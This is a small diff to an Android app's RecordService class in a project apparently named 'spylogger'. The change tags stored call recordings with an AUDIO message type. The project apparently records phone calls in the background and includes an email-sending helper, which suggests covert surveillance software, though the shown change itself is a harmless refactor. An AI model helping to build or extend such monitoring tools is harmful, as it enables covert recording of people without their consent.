@@ -14,6 +14,7 @@ import android.util.Log;
 import com.gmailsender.Utils;
 import com.gravatasufoca.spylogger.helpers.MediaRecorderHelper;
 import com.gravatasufoca.spylogger.model.Ligacao;
+import com.gravatasufoca.spylogger.model.TipoMensagem;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
@@ -116,7 +117,7 @@ public class RecordService extends Service{
 							topico = new Topico.TopicoBuilder()
 									.setNome(ligacao.getNome())
 									.setIdReferencia(ligacao.getNumero())
-									.build();
+									.build(TipoMensagem.AUDIO);
 
 							repositorioTopico.inserir(topico);
 						}
